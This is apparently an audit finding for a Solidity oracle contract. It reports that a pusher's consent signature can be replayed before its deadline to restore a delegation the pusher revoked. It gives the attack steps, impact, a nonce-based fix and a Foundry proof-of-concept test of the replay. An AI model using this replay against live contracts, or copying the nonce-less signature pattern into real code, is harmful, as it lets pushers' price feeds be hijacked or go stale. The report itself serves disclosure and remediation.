### Title
Pusher consent signature can be replayed within the deadline window to silently re-establish a revoked delegation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracle.allowPushers` accepts a pusher's EIP-191 consent signature and writes `namespaceRemapping[pusher] = msg.sender`. The signature is bound to `(chainid, oracle_address, deadline, pusher, creator)` but there is **no nonce and no used-signature tracking**. After a pusher calls `revokePusher()`, the creator can replay the original consent signature at any point before the deadline to silently re-establish the delegation. The pusher's revocation is therefore ineffective for the entire deadline window.

The code comment in `allowPushers` explicitly acknowledges the threat but misidentifies the deadline as the fix:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

The deadline only bounds the replay window; it does not prevent replay **within** the window.

---

### Finding Description

`allowPushers` performs three checks before writing `namespaceRemapping[pusher] = msg.sender`:

1. `_ensureDeadline(deadline)` — only verifies `block.timestamp <= deadline`
2. ECDSA recovery of `keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))`
3. Self-remapping guard [1](#0-0) 

None of these checks record that the signature was already consumed. `_ensureDeadline` is a pure timestamp comparison with no state write: [2](#0-1) 

`revokePusher` clears the mapping but leaves the original signature fully valid until the deadline: [3](#0-2) 

Attack sequence:

1. Pusher signs consent for Creator A with `deadline = block.timestamp + N days`.
2. Creator A calls `allowPushers` → `namespaceRemapping[pusher] = creatorA`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator A (or any party holding the signature) calls `allowPushers` again with the **identical** signature before `deadline`.
5. `namespaceRemapping[pusher] = creatorA` is re-established.
6. The pusher's subsequent `fallback` pushes resolve `creator = namespaceRemapping[msg.sender]` and land in Creator A's namespace, not the pusher's own. [4](#0-3) 

The pusher may not detect the re-establishment and continues pushing, believing they are writing to their own namespace. Their own namespace slots receive no new data.

---

### Impact Explanation

**Pusher's own namespace feeds go stale.** Any pool or price provider consuming feeds from `feedIdOf(pusher, slotIndex, positionIndex)` will read `price = 0 / timestampMs = 0` — the zero-state that every consumer is documented to reject as stale. This causes live swaps against those feeds to revert or halt, constituting a broken core pool functionality / unusable swap flow.

**Creator's namespace receives data the pusher did not intend to provide.** If the creator's pools are priced from the creator's namespace, the creator can force the pusher's price stream into their pools indefinitely within the deadline window, constituting a bad-price execution path where the oracle source is not the one the pool operator or LP expected.

The `feedIdOf` layout encodes the creator address directly into the feed identity, so the two namespaces are distinct storage locations with no overlap: [5](#0-4) 

---

### Likelihood Explanation

- The pusher must have previously signed a consent (they consented at some point), so no external key material is needed — the creator already holds the signature.
- The creator can replay the signature in a single transaction, including front-running the pusher's `revokePusher` call in the mempool.
- The window is as long as the deadline the pusher originally agreed to (commonly hours to days in off-chain oracle workflows).
- No privileged role is required; `allowPushers` is a public function callable by any `msg.sender`.

---

### Recommendation

Track consumed signatures with a per-pusher nonce or a `usedSignatures` bitmap keyed on the signature hash. The simplest fix is a per-pusher revocation counter that is included in the signed payload:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender,
        pusherNonce[pusher]   // <-- add nonce
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;        // <-- invalidate on use
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, `revokePusher` can increment the nonce so that any previously issued signature is immediately invalidated on revocation, regardless of the deadline.

### Proof of Concept

```solidity
function test_ReplayAllowPushersAfterRevoke() public {
    // Setup
    uint256 PUSHER_KEY = 0xBEEF;
    address pusher  = vm.addr(PUSHER_KEY);
    address creator = address(0xC0FFEE);
    vm.warp(1_700_000_000);

    uint256 deadline = block.timestamp + 1 days;

    // Pusher signs consent for creator
    bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
    bytes memory sig = abi.encodePacked(r, s, v);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 1: Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 2: Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 3: Creator replays the SAME signature — succeeds, no revert
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);

    // Delegation is re-established against the pusher's will
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 4: Pusher's next fallback push lands in creator's namespace, not their own
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw  = _packRaw(1_500_000, 4, 2);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);

    // Creator's namespace has the data; pusher's own namespace is empty
    assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0);
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher,  0, 0)).price, 0);
}
```

    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
